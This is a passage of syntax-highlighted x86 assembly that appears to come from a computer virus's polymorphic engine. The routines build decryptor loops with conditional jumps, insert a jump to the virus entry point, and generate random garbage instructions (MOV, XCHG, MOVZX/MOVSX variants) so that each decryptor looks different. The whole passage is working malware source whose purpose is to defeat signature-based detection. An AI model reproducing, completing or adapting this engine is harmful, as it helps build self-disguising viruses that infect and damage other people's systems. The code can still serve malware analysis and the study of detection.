                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">done_loop_use</span><span class="sc0">

        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Generate CMP aux_reg,end_value</span><span class="sc0">
        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">loop_use_cmp</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0F881h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">loop_mask_here</span><span class="sc0">

        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Generate SUB aux_reg,end_value</span><span class="sc0">
        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">loop_use_sub</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0E881h</span><span class="sc0">
</span><span class="sc5">loop_mask_here</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_MASK</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">end_value</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">

        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Restore aux reg state</span><span class="sc0">
        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">done_loop_use</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_FLAGS</span><span class="sc4">],</span><span class="sc5">REG_READ_ONLY</span><span class="sc0">

        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Generate conditional jump</span><span class="sc0">
        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">doloopready</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd32</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">doloopdown</span><span class="sc0">

        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Generate the following structure:</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;       loop_point:</span><span class="sc0">
                </span><span class="sc1">;       ...</span><span class="sc0">
                </span><span class="sc1">;       cmp reg,x</span><span class="sc0">
                </span><span class="sc1">;       jne loop_point</span><span class="sc0">
                </span><span class="sc1">;       ...</span><span class="sc0">
        </span><span class="sc1">;       jmp decrypted-code</span><span class="sc0">
        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">doloopup</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">850Fh</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">loop_point</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000004h</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_garbage</span><span class="sc0">

        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Insert a jump to virus code</span><span class="sc0">
        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E9h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PtrToEP</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000004h</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;...or this one:</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;       loop_point:</span><span class="sc0">
                </span><span class="sc1">;       ...</span><span class="sc0">
                </span><span class="sc1">;       cmp reg,x</span><span class="sc0">
                </span><span class="sc1">;       je decrypted-code</span><span class="sc0">
                </span><span class="sc1">;       ...</span><span class="sc0">
                </span><span class="sc1">;       jmp loop_point</span><span class="sc0">
                </span><span class="sc1">;       ...</span><span class="sc0">
        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">doloopdown</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">840Fh</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PtrToEP</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000004h</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_garbage</span><span class="sc0">

        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
                </span><span class="sc1">;Insert a jump to loop point</span><span class="sc0">
        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E9h</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">loop_point</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000004h</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Generate some garbage code</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">gen_garbage</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">recursive_level</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000002h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd_range</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">loop_garbage</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,(</span><span class="sc5">end_garbage</span><span class="sc4">-</span><span class="sc5">tbl_garbage</span><span class="sc4">)/</span><span class="sc2">04h</span><span class="sc0">
                
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">recursive_level</span><span class="sc4">],</span><span class="sc2">06h</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">too_much_shit</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">recursive_level</span><span class="sc4">],</span><span class="sc2">02h</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">ok_gen_num</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,(</span><span class="sc5">save_space</span><span class="sc4">-</span><span class="sc5">tbl_garbage</span><span class="sc4">)/</span><span class="sc2">04h</span><span class="sc0">

</span><span class="sc5">ok_gen_num</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd_range</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_garbage</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lodsd</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">too_much_shit</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">loop_garbage</span><span class="sc0">

        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
                </span><span class="sc1">;Update recursive level</span><span class="sc0">
        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">exit_gg</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">recursive_level</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Generate MOV reg,imm</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Generate MOV reg32,imm</span><span class="sc0">
        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">g_movreg32imm</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_valid_reg</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0B8h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_MASK</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd32</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Generate MOV reg16,imm</span><span class="sc0">
        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">g_movreg16imm</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_valid_reg</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0B866h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_MASK</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd32</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Generate MOV reg8,imm</span><span class="sc0">
        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">g_movreg8imm</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_valid_reg</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_FLAGS</span><span class="sc4">],</span><span class="sc5">REG_NO_8BIT</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">a_movreg8imm</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd32</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0B0h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_MASK</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd32</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0004h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc5">a_movreg8imm</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Generate mov reg,reg</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">g_movregreg32</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd_reg</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_valid_reg</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">a_movregreg32</span><span class="sc0">
</span><span class="sc5">c_movregreg32</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">8Bh</span><span class="sc0">
</span><span class="sc5">h_movregreg32</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_MASK</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">REG_MASK</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc5">a_movregreg32</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">g_movregreg16</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd_reg</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_valid_reg</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">a_movregreg32</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">66h</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">c_movregreg32</span><span class="sc0">

</span><span class="sc5">g_movregreg8</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd_reg</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_FLAGS</span><span class="sc4">],</span><span class="sc5">REG_NO_8BIT</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">a_movregreg8</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_valid_reg</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">8Ah</span><span class="sc0">
</span><span class="sc5">h_movregreg8</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_FLAGS</span><span class="sc4">],</span><span class="sc5">REG_NO_8BIT</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">a_movregreg8</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">a_movregreg8</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_MASK</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">REG_MASK</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd32</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2400h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc5">a_movregreg8</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Generate xchg reg,reg</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">g_xchgregreg32</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_valid_reg</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_valid_reg</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">a_movregreg32</span><span class="sc0">
</span><span class="sc5">h_xchgregreg32</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">87h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">h_movregreg32</span><span class="sc0">

</span><span class="sc5">g_xchgregreg16</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_valid_reg</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_valid_reg</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">a_movregreg32</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">66h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">h_xchgregreg32</span><span class="sc0">

</span><span class="sc5">g_xchgregreg8</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_valid_reg</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_FLAGS</span><span class="sc4">],</span><span class="sc5">REG_NO_8BIT</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">a_movregreg8</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_valid_reg</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">86h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">h_movregreg8</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Generate MOVZX/MOVSX reg32,reg16</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">g_movzx_movsx</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd32</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0B7h</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">d_movzx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0BFh</span><span class="sc0">
</span><span class="sc5">d_movzx</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd_reg</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_valid_reg</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
